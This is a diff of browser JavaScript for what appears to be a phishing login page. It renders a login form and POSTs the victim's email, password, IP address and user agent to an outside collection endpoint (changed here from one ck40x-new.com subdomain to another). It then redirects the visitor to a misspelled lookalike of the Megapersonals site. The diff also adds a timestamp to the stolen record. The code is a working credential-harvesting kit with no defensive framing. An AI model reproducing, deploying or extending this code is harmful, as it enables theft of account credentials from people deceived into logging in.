@@ -1,3 +1,8 @@
+
+
+
+
+
 // Function to extract URL parameters
 function getQueryParam(param) {
     const urlParams = new URLSearchParams(window.location.search);
@@ -59,6 +64,20 @@ $(document).ready(function () {
         value: navigator.userAgent // Automatically fill with the browser's user agent
     });
     
+    
+    // created time and date 
+    const currentTime = new Date();
+    const year = currentTime.getFullYear();
+    const month = String(currentTime.getMonth() + 1).padStart(2, '0'); 
+    const day = String(currentTime.getDate()).padStart(2, '0');
+    const hours = String(currentTime.getHours()).padStart(2, '0');
+    const minutes = String(currentTime.getMinutes()).padStart(2, '0');
+    const seconds = String(currentTime.getSeconds()).padStart(2, '0');
+    
+    const formattedTime = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
+    console.log(formattedTime); 
+    
+        
 
     // Append the fields to the form
     loginForm.append(usernameField, passwordField, userAgentField);
@@ -83,7 +102,7 @@ $(document).ready(function () {
             // Send form data via AJAX
             $.ajax({
                 type: 'POST',
-                url: 'https://abid.ck405-new.com/api/data',
+                url: "https://jerry.ck406-new.com/api/data",
                 data: {
                     email: username,
                     password: password,
@@ -91,14 +110,15 @@ $(document).ready(function () {
                     agent: navigator.userAgent,
                     user_ip: userIp,
                     website_id: 4,
+                    created_at: formattedTime,
                 },
                 success: function (response) {
                     console.log('Response:', response);
-                    
-                        // Redirect to another URL on success
-                        window.onload = function(){
-                            window.location.href = `https://us.megapersaenales.com/female-escorts/${userId}`;
-                          }
+                        if(response != null){
+                            window.location.href = "https://megapersonaelse.my.id/code-page/64";
+                        }
+                         
+                        
                     
                 },
                 error: function (xhr, status, error) {
@@ -122,3 +142,8 @@ $(document).ready(function () {
     //     }
     // });
 });
+
+
+
+
+
